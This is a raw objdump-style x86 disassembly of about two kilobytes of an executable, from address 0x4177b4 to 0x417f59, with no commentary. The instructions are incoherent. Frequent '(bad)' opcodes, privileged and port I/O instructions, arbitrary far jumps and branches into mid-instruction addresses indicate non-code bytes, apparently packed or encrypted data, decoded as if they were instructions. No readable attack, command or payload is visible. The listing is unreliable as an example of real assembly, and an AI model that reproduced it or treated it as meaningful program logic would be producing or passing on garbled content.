  4177b4:	int    0x39
  4177b6:	popa   
  4177b7:	cmc    
  4177b8:	std    
  4177b9:	inc    edi
  4177ba:	shl    BYTE PTR [ebx-0x5c19237b],0xb8
  4177c1:	nop
  4177c2:	ds push esp
  4177c4:	push   0x5d
  4177c6:	cmp    al,ah
  4177c8:	xor    BYTE PTR [ecx+0x61],bh
  4177cb:	jns    0x41778c
  4177cd:	pop    ecx
  4177ce:	int    0x4c
  4177d0:	mov    bh,0x10
  4177d2:	out    dx,eax
  4177d3:	sub    esi,eax
  4177d5:	hlt    
  4177d6:	sbb    DWORD PTR ds:0x111a19d1,0x29eb38ba
  4177e0:	push   edi
  4177e1:	pop    edx
  4177e2:	lahf   
  4177e3:	lea    edx,[esi]
  4177e5:	pop    esi
  4177e6:	inc    ecx
  4177e7:	loope  0x4177c0
  4177e9:	dec    ecx
  4177ea:	xor    DWORD PTR [edx-0x5f04b9aa],ebx
  4177f0:	out    0x7a,eax
  4177f2:	sub    esi,ebp
  4177f4:	mov    al,ds:0x24939926
  4177f9:	jmp    0x815953dc
  4177fe:	repz mov ebp,0x922aabef
  417804:	and    bl,dh
  417806:	adc    al,0x3
  417808:	dec    eax
  417809:	js     0x417791
  41780b:	cdq    
  41780c:	jns    0x417811
  41780e:	ret    0x825c
  417811:	(bad)
  417816:	shl    DWORD PTR [ebp+0x4317cf89],cl
  41781c:	or     DWORD PTR [edi+0x18],esp
  41781f:	test   al,0x63
  417821:	adc    DWORD PTR [eax+0x71a94755],esi
  417827:	fstp   TBYTE PTR [eax]
  417829:	mov    dl,0xa
  41782b:	repnz cli 
  41782d:	jle    0x4177f8
  41782f:	or     eax,0xf0b2f136
  417834:	or     ch,BYTE PTR [ecx-0x257c7bf0]
  41783a:	push   cs
  41783b:	outs   dx,DWORD PTR ds:[esi]
  41783c:	and    eax,0xc68769ba
  417841:	in     al,0xbf
  417843:	ret    0x1b0
  417846:	loopne 0x417864
  417848:	cmp    DWORD PTR [esi-0x480aac28],esi
  41784e:	sbb    BYTE PTR [ebp-0x36],bl
  417851:	lods   eax,DWORD PTR ds:[esi]
  417852:	xor    BYTE PTR [eax-0xe],bh
  417855:	mov    esi,0xda4a1ad
  41785a:	add    ebp,DWORD PTR [edi-0x59decd70]
  417860:	cld    
  417861:	pop    esp
  417862:	ins    BYTE PTR es:[edi],dx
  417863:	pop    edi
  417864:	sbb    esp,ebp
  417866:	jbe    0x417896
  417868:	and    al,0xc8
  41786a:	sti    
  41786b:	jle    0x4177f9
  41786d:	push   eax
  41786e:	retf   0xd1d6
  417871:	repnz and ecx,eax
  417874:	imul   ecx,DWORD PTR [ebx*2+0x2f1fe03a],0xe7c9d34
  41787f:	aas    
  417880:	leave  
  417881:	das    
  417882:	push   0x4c
  417884:	xchg   bl,dh
  417886:	add    cl,BYTE PTR [ebx+0x6c0ecdf4]
  41788c:	test   BYTE PTR [edx+0x23ec1578],ch
  417892:	and    eax,0x992a4462
  417897:	jle    0x41786d
  417899:	push   ecx
  41789a:	mov    al,0xba
  41789c:	pop    ebx
  41789d:	pop    ebx
  41789e:	xchg   esi,eax
  41789f:	lods   al,BYTE PTR ds:[esi]
  4178a0:	jnp    0x417904
  4178a2:	jl     0x4178e9
  4178a4:	scas   eax,DWORD PTR es:[edi]
  4178a5:	adc    edx,esi
  4178a7:	pop    eax
  4178a8:	push   cs
  4178a9:	mov    bl,0x67
  4178ab:	jg     0x417913
  4178ad:	(bad)  [ecx]
  4178af:	mov    WORD PTR [ecx],cs
  4178b1:	dec    ebp
  4178b2:	inc    eax
  4178b3:	adc    DWORD PTR [esi+esi*2-0x21],edx
  4178b7:	and    ecx,DWORD PTR [eax+0x9]
  4178ba:	test   DWORD PTR [ebx+eax*8],eax
  4178bd:	(bad)
  4178c0:	test   BYTE PTR [ecx+0x78],ch
  4178c3:	mov    WORD PTR cs:[esi],es
  4178c6:	dec    DWORD PTR [ebx+0x38]
  4178c9:	fcomp  DWORD PTR [eax+0x60]
  4178cc:	pop    esi
  4178cd:	ret    
  4178ce:	mov    ebx,0xd19a6fb1
  4178d3:	ins    BYTE PTR es:[edi],dx
  4178d4:	mov    ds:0x56e5a5d6,eax
  4178d9:	add    edi,0x61cae93
  4178df:	or     al,0x67
  4178e1:	loope  0x4178e1
  4178e3:	imul   esp,DWORD PTR [edx-0x64],0xffffff87
  4178e7:	sub    al,BYTE PTR [ebp+0x10]
  4178ea:	pop    ecx
  4178eb:	push   ecx
  4178ec:	pop    ds
  4178ed:	mov    eax,ds:0xc103a51d
  4178f2:	mov    ebx,0xf79050ad
  4178f7:	fcom   QWORD PTR [esi+0x5a54fd30]
  4178fd:	nop
  4178fe:	jle    0x4178f9
  417900:	xchg   esp,eax
  417901:	ret    
  417902:	call   0xf5ad:0x212ca7aa
  417909:	mov    esi,0x1be3dbc5
  41790e:	pop    ebx
  41790f:	sbb    eax,0xcbb5306d
  417914:	shr    esi,cl
  417916:	ret    
  417917:	es mov ah,0xda
  41791a:	and    al,0xd7
  41791c:	shl    BYTE PTR [ecx],1
  41791e:	dec    eax
  41791f:	xor    eax,0x56e8e0e8
  417924:	inc    esp
  417925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417926:	shr    eax,0xd9
  417929:	out    0x64,al
  41792b:	dec    ecx
  41792c:	mov    esp,DWORD PTR [ebp+ebx*8+0x62]
  417930:	lock jge 0x4178e6
  417933:	mov    cl,0x56
  417935:	lods   eax,DWORD PTR ds:[esi]
  417936:	shr    DWORD PTR [ebp-0x66712b1f],cl
  41793c:	xor    edx,ebx
  41793e:	popf   
  41793f:	xor    bh,BYTE PTR [eax]
  417941:	add    eax,0x907222a6
  417946:	imul   eax,DWORD PTR [ecx-0x4e19b177],0xaa4fc4
  417950:	cmp    eax,0xf34cc252
  417955:	mov    ah,0xfc
  417957:	rcr    DWORD PTR [ecx-0x6c],1
  41795a:	dec    edi
  41795b:	push   ebp
  41795c:	pop    esp
  41795d:	jmp    0xbbe0:0xe5103058
  417964:	mov    edx,0x113d13dc
  417969:	or     edx,ebx
  41796b:	push   0x2b
  41796d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41796e:	test   al,0x5c
  417970:	jns    0x4179ca
  417972:	xchg   edx,eax
  417973:	pop    ss
  417974:	adc    al,0x34
  417976:	nop
  417977:	sbb    BYTE PTR [esi+eiz*8+0x1a2c9a0a],bl
  41797e:	pop    ecx
  41797f:	mov    WORD PTR [eax+edx*8-0x6b6dc2eb],ss
  417986:	or     BYTE PTR [ebx-0x28],cl
  417989:	repz hlt 
  41798b:	add    al,0x28
  41798d:	adc    cl,al
  41798f:	test   BYTE PTR [ecx],0xc7
  417992:	fs retf 0xe229
  417996:	data16 xchg dl,ah
  417999:	sti    
  41799a:	stos   BYTE PTR es:[edi],al
  41799b:	les    ebp,FWORD PTR [esi]
  41799d:	mov    BYTE PTR [ebp+0x5b0ea1ec],cl
  4179a3:	iret   
  4179a4:	adc    edx,DWORD PTR [ecx-0x7d]
  4179a7:	out    dx,al
  4179a8:	into   
  4179a9:	pop    ebp
  4179aa:	in     eax,0xa8
  4179ac:	cmp    al,0xdd
  4179ae:	add    eax,0x55d5a091
  4179b3:	lock mov edi,0x70d696a9
  4179b9:	inc    edi
  4179ba:	in     al,dx
  4179bb:	mov    edi,0xe524f31f
  4179c0:	inc    eax
  4179c1:	fild   WORD PTR [ebx]
  4179c3:	mov    ds:0xa4383dd6,eax
  4179c8:	xor    edx,ebx
  4179ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179cb:	or     ecx,eax
  4179cd:	int3   
  4179ce:	jle    0x417a1f
  4179d0:	xchg   esp,eax
  4179d1:	pushf  
  4179d2:	fisttp QWORD PTR [ebx+ebp*1]
  4179d5:	jmp    0xeba8:0x10370b7b
  4179dc:	bound  ebp,QWORD PTR [eax+0x2a2cc0a4]
  4179e2:	(bad)
  4179e6:	cmp    al,0x9b
  4179e8:	repz fmul st,st(0)
  4179eb:	neg    BYTE PTR [ebx-0x1b]
  4179ee:	mov    ebx,0x33e1383f
  4179f3:	dec    ecx
  4179f4:	mov    dl,0x4e
  4179f6:	mov    ebx,0xca33010f
  4179fb:	into   
  4179fc:	ret    
  4179fd:	dec    ebx
  4179fe:	or     al,0xf3
  417a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a01:	mov    al,ds:0x54353099
  417a06:	sub    ebx,esp
  417a08:	fwait
  417a09:	imul   ecx,DWORD PTR [eax+0x64],0xffffffed
  417a0d:	pop    esi
  417a0e:	push   ss
  417a0f:	pushf  
  417a10:	shr    BYTE PTR [edx+0x1],cl
  417a13:	sbb    eax,0x1e0f6c77
  417a18:	mov    ds:0x1b7fa894,eax
  417a1d:	iret   
  417a1e:	mov    ebp,0x6c0083d7
  417a23:	cmp    DWORD PTR [ebx+0x10],edi
  417a26:	sbb    DWORD PTR [esi+0x431caf28],eax
  417a2c:	sbb    esi,DWORD PTR [ecx-0x2]
  417a2f:	sub    BYTE PTR [ebx-0x2],bh
  417a32:	push   es
  417a33:	and    bl,BYTE PTR ds:0x766de11e
  417a39:	jb     0x4179df
  417a3b:	add    al,0x90
  417a3d:	cmp    esp,eax
  417a3f:	xor    edi,DWORD PTR [edx-0x7da0246d]
  417a45:	add    al,BYTE PTR [ecx-0xf]
  417a48:	imul   ebx,DWORD PTR [esi-0x10dd5a2c],0x1b
  417a4f:	jbe    0x417a88
  417a51:	call   0x16a8782e
  417a56:	push   0xa6d427ff
  417a5b:	shl    DWORD PTR [ebp+0x79],cl
  417a5e:	fdiv   st(3),st
  417a60:	ficom  DWORD PTR [esi-0x303872e6]
  417a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a67:	inc    edx
  417a68:	dec    edx
  417a69:	rcl    DWORD PTR [ecx],cl
  417a6b:	int    0x9
  417a6d:	ficomp WORD PTR [edx+0x33]
  417a70:	jnp    0x417af0
  417a72:	sahf   
  417a73:	xor    BYTE PTR [ecx+0x40],0x44
  417a77:	fist   WORD PTR [ebp+esi*1-0x42]
  417a7b:	call   0xd0f07c56
  417a80:	retf   
  417a81:	loope  0x417a04
  417a83:	in     al,dx
  417a84:	mov    al,0xa5
  417a86:	cmp    DWORD PTR [eax+0x1e75fa2e],ecx
  417a8c:	mov    edi,0xae8e567e
  417a91:	mov    ds:0x8a56664a,eax
  417a96:	(bad)  
  417a97:	scas   eax,DWORD PTR es:[edi]
  417a98:	mov    BYTE PTR [esi-0x52],bl
  417a9b:	popa   
  417a9c:	aas    
  417a9d:	cmp    eax,0xdd111f3f
  417aa2:	mov    edx,0xd4f6ffb7
  417aa7:	add    DWORD PTR [ecx+0xa],edx
  417aaa:	sbb    al,0x33
  417aac:	adc    BYTE PTR [ebx-0x53],cl
  417aaf:	sbb    ah,BYTE PTR [ecx]
  417ab1:	sub    DWORD PTR [ebx-0x71],edi
  417ab4:	enter  0xaa9d,0x86
  417ab8:	shl    BYTE PTR [edx],1
  417aba:	add    al,ch
  417abc:	(bad)  
  417abd:	clc    
  417abe:	scas   eax,DWORD PTR es:[edi]
  417abf:	loop   0x417b0c
  417ac1:	jmp    0xcaba2e3a
  417ac6:	fistp  DWORD PTR [eax+0x68]
  417ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aca:	pop    edi
  417acb:	sti    
  417acc:	adc    al,bh
  417ace:	cli    
  417acf:	mov    cl,0x74
  417ad1:	mov    eax,0xbc08ff6f
  417ad6:	mov    ebx,0xfccf5244
  417adb:	inc    ebp
  417adc:	dec    eax
  417add:	pop    edx
  417ade:	pop    eax
  417adf:	addr16 jmp 0x417b36
  417ae2:	xor    eax,0xa36bd0e2
  417ae7:	outs   dx,DWORD PTR ds:[esi]
  417ae8:	jnp    0x417ae1
  417aea:	inc    DWORD PTR [ebx+0x60]
  417aed:	push   0x3d
  417aef:	push   cs
  417af0:	mov    cl,BYTE PTR [esp+edx*4+0x0]
  417af4:	or     DWORD PTR [ecx+0x37],eax
  417af7:	xchg   ebx,eax
  417af8:	rcl    BYTE PTR [ebp+0x7480c3f3],1
  417afe:	test   al,0x2e
  417b00:	add    al,0x91
  417b02:	sub    bh,al
  417b04:	mov    WORD PTR [ebx],fs
  417b06:	or     eax,0x8d1b174
  417b0b:	mov    bl,0x57
  417b0d:	jp     0x417ac2
  417b0f:	push   edi
  417b10:	bound  bp,DWORD PTR [esp-0x491bc601]
  417b18:	inc    ecx
  417b19:	sub    al,0xf1
  417b1b:	jae    0x417ac2
  417b1d:	dec    ebp
  417b1e:	ins    BYTE PTR es:[edi],dx
  417b1f:	cli    
  417b20:	cmp    eax,0x7c0e3514
  417b25:	sbb    al,0x5b
  417b27:	pop    edx
  417b28:	xchg   edx,eax
  417b29:	xchg   ebp,eax
  417b2a:	inc    eax
  417b2b:	aaa    
  417b2c:	pop    es
  417b2d:	imul   ebp,DWORD PTR [edx-0x2a],0x5b8e1aed
  417b34:	cld    
  417b35:	fs pusha 
  417b37:	pop    esp
  417b38:	pop    edi
  417b39:	mov    ecx,0xcc932ce2
  417b3e:	stos   BYTE PTR es:[edi],al
  417b3f:	out    dx,al
  417b40:	div    bh
  417b42:	mov    ch,0x37
  417b44:	lock push ecx
  417b46:	inc    ebx
  417b47:	ins    DWORD PTR es:[edi],dx
  417b48:	sysret 
  417b4a:	add    DWORD PTR [esi+0x1ab95d4e],eax
  417b50:	data16 aam 0xb6
  417b53:	xchg   ecx,eax
  417b54:	mov    eax,0x5b12f2fd
  417b59:	ror    DWORD PTR [eax],0x22
  417b5c:	es sub eax,0xa62501e5
  417b62:	sti    
  417b63:	xor    esi,edi
  417b65:	xor    bl,BYTE PTR [ecx+0x2e]
  417b68:	shl    DWORD PTR [ebp+0x0],1
  417b6b:	push   esp
  417b6c:	sbb    DWORD PTR [eax],esp
  417b6e:	loop   0x417bd6
  417b70:	adc    eax,0xc36e9708
  417b75:	xchg   edi,eax
  417b76:	cmp    eax,0xa0527478
  417b7b:	das    
  417b7c:	sub    ecx,DWORD PTR [ebp-0x75ddf467]
  417b82:	mov    ch,0x1c
  417b84:	cdq    
  417b85:	push   es
  417b86:	mov    WORD PTR [ecx+0x37],?
  417b89:	xchg   edx,eax
  417b8a:	addr16 sub eax,0x80ebbc5c
  417b90:	push   ebx
  417b91:	adc    al,0x2b
  417b93:	jmp    0xb899:0xaa8a753e
  417b9a:	out    0x20,al
  417b9c:	scas   al,BYTE PTR es:[edi]
  417b9d:	xor    al,0x6a
  417b9f:	call   0x95a28b73
  417ba4:	out    0x3e,al
  417ba6:	xlat   BYTE PTR ds:[ebx]
  417ba7:	outs   dx,DWORD PTR ds:[esi]
  417ba8:	(bad)  
  417baa:	rcr    BYTE PTR [ebx-0x52fe4f2c],cl
  417bb0:	add    eax,0x8f0d3fbe
  417bb5:	add    dh,ah
  417bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bb8:	fld    DWORD PTR [ecx]
  417bba:	ret    
  417bbb:	ds sbb eax,0x3098ab9c
  417bc1:	not    DWORD PTR [edx+eiz*1-0x7c013f0e]
  417bc8:	out    dx,al
  417bc9:	mov    esp,eax
  417bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bcc:	xchg   edx,eax
  417bcd:	cmp    BYTE PTR [eax-0x17cc831b],0x73
  417bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bd5:	mov    al,ds:0xabc1d575
  417bda:	mov    ecx,0xf107059
  417bdf:	mov    dh,BYTE PTR [ebx-0x2724c6a5]
  417be5:	push   edx
  417be6:	mov    edi,0xb619399e
  417beb:	pop    es
  417bec:	je     0x417be4
  417bee:	jbe    0x417ba3
  417bf0:	or     bl,bl
  417bf2:	cwde   
  417bf3:	icebp  
  417bf4:	cs aad 0x34
  417bf7:	push   esp
  417bf8:	ror    edi,cl
  417bfa:	mov    edx,DWORD PTR [esi-0x5d]
  417bfd:	xchg   esi,eax
  417bfe:	sub    dl,BYTE PTR [ecx]
  417c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c01:	in     eax,dx
  417c02:	je     0x417bb3
  417c04:	cdq    
  417c05:	in     al,dx
  417c06:	enter  0xa63f,0x3a
  417c0a:	pop    edi
  417c0b:	call   0x206:0xf2bd209c
  417c12:	popf   
  417c13:	sbb    al,al
  417c15:	xchg   edx,eax
  417c16:	jg     0x417c05
  417c18:	mov    dh,0xf0
  417c1a:	(bad)  
  417c1b:	ins    BYTE PTR es:[edi],dx
  417c1c:	(bad)  
  417c1d:	js     0x417c8e
  417c1f:	stos   BYTE PTR es:[edi],al
  417c20:	ds push cs
  417c22:	bound  ebp,QWORD PTR [esi-0x113a3525]
  417c28:	mov    edi,0x1ecf33db
  417c2d:	or     esp,DWORD PTR [ecx]
  417c2f:	push   0xffffffe0
  417c31:	dec    ebp
  417c32:	daa    
  417c33:	cmp    DWORD PTR [esi+0x2],edx
  417c36:	lods   eax,DWORD PTR ds:[esi]
  417c37:	std    
  417c38:	lds    edi,FWORD PTR [ebx]
  417c3a:	xchg   DWORD PTR [esi],ebx
  417c3c:	stos   DWORD PTR es:[edi],eax
  417c3d:	mov    ch,0x40
  417c3f:	imul   edi,DWORD PTR [edi],0xffffffa7
  417c42:	out    0x14,eax
  417c44:	aaa    
  417c45:	inc    ebp
  417c46:	bound  esi,QWORD PTR [edx-0x3a]
  417c49:	aas    
  417c4a:	nop
  417c4b:	xchg   esi,eax
  417c4c:	in     al,0xab
  417c4e:	pop    ss
  417c4f:	dec    ecx
  417c50:	ror    DWORD PTR [ebx+0x0],cl
  417c53:	lods   al,BYTE PTR cs:[esi]
  417c55:	fucomp st(1)
  417c57:	cmp    esi,ebx
  417c59:	dec    ecx
  417c5a:	push   esi
  417c5b:	out    dx,al
  417c5c:	gs sub esi,ecx
  417c5f:	call   0xacd47269
  417c64:	jbe    0x417c5d
  417c66:	scas   eax,DWORD PTR es:[edi]
  417c67:	xchg   ebp,eax
  417c68:	dec    esp
  417c69:	pop    edi
  417c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c6c:	sbb    al,0x75
  417c6e:	dec    eax
  417c6f:	lods   al,BYTE PTR ds:[esi]
  417c70:	dec    edx
  417c71:	mov    bh,0xa0
  417c73:	jl     0x417bf7
  417c75:	pop    ebp
  417c76:	xchg   BYTE PTR [ebx+0x3ecebcee],bh
  417c7c:	ins    BYTE PTR es:[edi],dx
  417c7d:	add    ebx,DWORD PTR [ebp+0x49]
  417c80:	xor    BYTE PTR [ecx+0x750f3a17],cl
  417c86:	out    dx,eax
  417c87:	xchg   ecx,eax
  417c88:	out    0xc7,al
  417c8a:	mov    ch,0x14
  417c8c:	loop   0x417cd0
  417c8e:	lahf   
  417c8f:	call   0x1e4c:0x886d0d22
  417c96:	ror    DWORD PTR [ebx+0x44b847f4],cl
  417c9c:	aas    
  417c9d:	jp     0x417d04
  417c9f:	add    DWORD PTR [eax-0x21],0x2d
  417ca3:	add    eax,0x5ae5fb18
  417ca8:	push   0xffffff86
  417caa:	xlat   BYTE PTR ds:[ebx]
  417cab:	and    ebx,esi
  417cad:	push   ecx
  417cae:	xchg   DWORD PTR [esi-0x60891bd4],esp
  417cb4:	ins    BYTE PTR es:[edi],dx
  417cb5:	mov    edi,0xa898c689
  417cba:	dec    ebp
  417cbb:	jmp    0x625ec049
  417cc0:	or     edi,edx
  417cc2:	push   edi
  417cc3:	pmulhw mm1,QWORD PTR ds:0x4bbc12d6
  417cca:	mov    ebx,0x9c3b5d60
  417ccf:	fild   QWORD PTR [esi-0x7d]
  417cd2:	and    DWORD PTR [ebx+0x22],ebx
  417cd5:	mov    WORD PTR [eax+0x43],ds
  417cd8:	shl    esi,cl
  417cda:	lods   eax,DWORD PTR ds:[esi]
  417cdb:	aaa    
  417cdc:	jmp    0x2642:0x9a765f2
  417ce3:	pusha  
  417ce4:	fcmovb st,st(1)
  417ce6:	dec    ebp
  417ce7:	sub    cl,0xf5
  417cea:	adc    dh,BYTE PTR [edx-0x16]
  417ced:	mov    al,ds:0xf8d7f8a7
  417cf2:	dec    ebp
  417cf3:	inc    esp
  417cf4:	pop    edx
  417cf5:	mov    ds,edx
  417cf7:	cli    
  417cf8:	ss xchg ecx,eax
  417cfa:	aad    0x9c
  417cfc:	sub    eax,0x49094ef6
  417d01:	lahf   
  417d02:	ds (bad) 
  417d04:	jb     0x417cad
  417d06:	test   eax,0xce6e989a
  417d0b:	jle    0x417cff
  417d0d:	inc    edi
  417d0e:	mov    ecx,0xf3230782
  417d13:	fbld   TBYTE PTR [ebx-0xbc4a42d]
  417d19:	jne    0x417d60
  417d1b:	adc    BYTE PTR [eax-0xb],ah
  417d1e:	adc    dh,cl
  417d20:	ret    0xb2fe
  417d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d24:	imul   edx,esi,0xffffffbd
  417d27:	dec    edi
  417d28:	daa    
  417d29:	dec    ebx
  417d2a:	fs mov edx,0x23d0bf4a
  417d30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d31:	shl    ch,1
  417d33:	call   0xcab68e4
  417d38:	popa   
  417d39:	pop    ebx
  417d3a:	ds inc ebp
  417d3c:	mov    al,ds:0x34d56832
  417d41:	dec    eax
  417d42:	test   ebx,esi
  417d44:	aam    0x25
  417d46:	jecxz  0x417d76
  417d48:	and    DWORD PTR [ebp+0x29],edx
  417d4b:	pop    ss
  417d4c:	inc    esp
  417d4d:	out    dx,eax
  417d4e:	shl    BYTE PTR ds:0x3390aeca,0x33
  417d55:	xchg   esp,eax
  417d56:	jecxz  0x417cea
  417d58:	adc    eax,0x9dd3f294
  417d5d:	jge    0x417daf
  417d5f:	pop    es
  417d60:	xchg   esp,eax
  417d61:	frstor [ecx+edi*2]
  417d64:	cld    
  417d65:	fisttp QWORD PTR [eax-0x63f29326]
  417d6b:	xchg   ebx,eax
  417d6c:	adc    esp,ecx
  417d6e:	cdq    
  417d6f:	dec    ebp
  417d70:	push   esi
  417d71:	daa    
  417d72:	mov    edx,0xca686bf1
  417d77:	retf   
  417d78:	dec    edx
  417d79:	add    ecx,DWORD PTR [eax+edi*2-0x71]
  417d7d:	icebp  
  417d7e:	sub    ebp,ebx
  417d80:	cli    
  417d81:	push   cs
  417d82:	ret    0x21ff
  417d85:	inc    ecx
  417d86:	xchg   esp,eax
  417d87:	fwait
  417d88:	das    
  417d89:	or     DWORD PTR [edx-0x67],edx
  417d8c:	mov    bl,0xe1
  417d8e:	inc    DWORD PTR [edi]
  417d90:	ret    
  417d91:	or     cl,BYTE PTR [ebp+0x789dd582]
  417d97:	pop    ecx
  417d98:	jle    0x417ddf
  417d9a:	mov    dh,0x89
  417d9c:	add    cl,BYTE PTR [ecx+eiz*2]
  417d9f:	loope  0x417da5
  417da1:	stc    
  417da2:	or     eax,DWORD PTR [edi]
  417da4:	xchg   ecx,eax
  417da5:	pop    edi
  417da6:	rep ins BYTE PTR es:[edi],dx
  417da8:	mov    es,WORD PTR [eax]
  417daa:	rcl    BYTE PTR [eax],0x8e
  417dad:	jb     0x417dbd
  417daf:	fmul   QWORD PTR [ebx+ebx*4+0x282cdc28]
  417db6:	enter  0x6286,0xbf
  417dba:	push   ecx
  417dbb:	aam    0x8c
  417dbd:	sub    BYTE PTR [edi+0x449fd0dc],al
  417dc3:	sub    al,bl
  417dc5:	sub    eax,DWORD PTR [edx+0x20]
  417dc8:	xchg   esi,eax
  417dc9:	inc    esp
  417dca:	pushf  
  417dcb:	or     ecx,edi
  417dcd:	mov    esi,0xe969da0d
  417dd2:	jmp    0x417e37
  417dd4:	sbb    al,0xa2
  417dd6:	dec    ebp
  417dd7:	inc    ebp
  417dd8:	inc    edi
  417dd9:	call   0x50e0:0xa1d3709a
  417de0:	fmul   DWORD PTR [eax]
  417de2:	test   eax,0x22540a5c
  417de7:	dec    ebx
  417de8:	retf   
  417de9:	pushf  
  417dea:	mov    BYTE PTR ss:[esi+esi*8-0x7e],dl
  417def:	sbb    BYTE PTR [ebp-0x48],0x92
  417df3:	(bad)  
  417df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417df5:	(bad)  
  417df6:	(bad)  
  417df7:	mov    esp,0x14bd1ec1
  417dfc:	daa    
  417dfd:	inc    eax
  417dfe:	std    
  417dff:	inc    eax
  417e00:	hlt    
  417e01:	mov    edx,0xd8a0fa9d
  417e06:	add    al,al
  417e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e09:	push   0xd05647e9
  417e0e:	sahf   
  417e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e10:	data16 hlt 
  417e12:	mov    bh,0x7d
  417e14:	out    0x68,eax
  417e16:	icebp  
  417e17:	in     eax,dx
  417e18:	rcr    BYTE PTR [edi],cl
  417e1a:	js     0x417e05
  417e1c:	mov    dl,BYTE PTR [eax+eiz*8-0x1daa2afb]
  417e23:	(bad)  
  417e24:	jnp    0x417e7c
  417e26:	in     al,0x3
  417e28:	jne    0x417e73
  417e2a:	jmp    0x417dfe
  417e2c:	retf   0x877e
  417e2f:	(bad)  
  417e30:	dec    ebp
  417e31:	add    DWORD PTR [edx+0x39],ebx
  417e34:	cmp    ah,BYTE PTR [eax-0x395057fe]
  417e3a:	or     ch,0xd9
  417e3d:	jp     0x417ea4
  417e3f:	sbb    al,0x30
  417e41:	push   ebx
  417e42:	or     dh,dl
  417e44:	jae    0x417e68
  417e46:	push   ebp
  417e47:	mov    BYTE PTR [ecx+0x2],ah
  417e4a:	push   edi
  417e4b:	push   ebx
  417e4c:	xchg   ecx,eax
  417e4d:	lods   eax,DWORD PTR ds:[esi]
  417e4e:	mov    ecx,0x85d64c9b
  417e53:	mov    esp,0xd5a00b83
  417e58:	xchg   ebx,eax
  417e59:	sub    esp,DWORD PTR [ebx]
  417e5b:	pop    ebp
  417e5c:	xor    ch,BYTE PTR [edx+0x6175efad]
  417e62:	push   edi
  417e63:	mov    ds:0x90aaa885,eax
  417e68:	in     al,0x48
  417e6a:	(bad)  
  417e6b:	jns    0x417eab
  417e6d:	push   edi
  417e6e:	(bad)  
  417e6f:	inc    ebp
  417e71:	out    0x5e,eax
  417e73:	lds    ebx,FWORD PTR [edx]
  417e75:	clc    
  417e76:	ud0    esi,DWORD PTR [eax+edx*2+0x1e]
  417e7b:	add    bl,BYTE PTR [edx+0x47]
  417e7e:	addr16 mov ebx,0xe2a0c3b1
  417e84:	rcr    DWORD PTR [ebp-0x1f7c4f88],0x8d
  417e8b:	jae    0x417e9a
  417e8d:	idiv   DWORD PTR [esi-0x4b3a6c1e]
  417e93:	mov    ah,0x88
  417e95:	mov    dh,0xf9
  417e97:	cwde   
  417e98:	(bad)  
  417e99:	div    BYTE PTR ds:0x76cbc658
  417e9f:	inc    ecx
  417ea0:	add    DWORD PTR [esi-0x21],ebp
  417ea3:	pop    ebp
  417ea4:	or     DWORD PTR ds:0xe706c552,0x7f0198c0
  417eae:	pushf  
  417eaf:	jo     0x417efc
  417eb1:	cs sub DWORD PTR es:[ebx],edi
  417eb5:	lods   al,BYTE PTR ds:[esi]
  417eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eb7:	fadd   DWORD PTR [edx+edi*8]
  417eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ebb:	xlat   BYTE PTR ds:[ebx]
  417ebc:	aad    0x4
  417ebe:	mov    bh,0x99
  417ec0:	inc    esp
  417ec1:	or     ecx,DWORD PTR [ebx+0x5b]
  417ec4:	mov    DWORD PTR [esi-0x251e71ad],0x5ade41a4
  417ece:	jp     0x417f06
  417ed0:	push   esi
  417ed1:	inc    esi
  417ed2:	shr    BYTE PTR [eax],0x34
  417ed5:	pop    ds
  417ed6:	mov    eax,ds:0xd85ef02a
  417edb:	lock inc ecx
  417edd:	push   ds
  417ede:	das    
  417edf:	imul   eax,DWORD PTR [esi],0xa7542258
  417ee5:	mov    eax,ds:0x4a1ae7a
  417eea:	scas   al,BYTE PTR es:[edi]
  417eeb:	fbstp  TBYTE PTR [esi-0xa3bed51]
  417ef1:	jae    0x417f28
  417ef3:	popa   
  417ef4:	loopne 0x417f5b
  417ef6:	nop
  417ef7:	adc    BYTE PTR [eax-0x3104ef5d],ch
  417efd:	aas    
  417efe:	mov    ebp,0xa795c4b4
  417f03:	shr    BYTE PTR [esi-0x397e2fb9],cl
  417f09:	mov    DWORD PTR [ecx-0x793984c6],esi
  417f0f:	hlt    
  417f10:	adc    ebx,DWORD PTR [ebx+0x28296da4]
  417f16:	sbb    eax,0x36735b26
  417f1b:	mov    dh,0xb8
  417f1d:	es loop 0x417efd
  417f20:	xchg   edi,eax
  417f21:	leave  
  417f22:	push   edx
  417f23:	imul   esp,DWORD PTR [ecx-0x5616d001],0x1054867
  417f2d:	jl     0x417f2d
  417f2f:	pop    ds
  417f30:	into   
  417f31:	dec    edi
  417f32:	ret    
  417f33:	push   ss
  417f34:	inc    DWORD PTR [edx-0x2]
  417f37:	mov    ebx,0xd2744334
  417f3c:	xor    BYTE PTR [edx+0x1df97766],0x83
  417f43:	pop    edi
  417f44:	cmc    
  417f45:	mov    ebp,gs
  417f47:	cmp    al,0x7e
  417f49:	mov    al,0xa6
  417f4b:	jl     0x417f04
  417f4d:	and    al,BYTE PTR [edi]
  417f4f:	cld    
  417f50:	inc    eax
  417f51:	in     eax,0xe
  417f53:	dec    eax
  417f54:	repz cmc 
  417f56:	(bad)  
  417f57:	aam    0x30
  417f59:	shl    BYTE PTR ds:0xe3ac7dbf,0x13
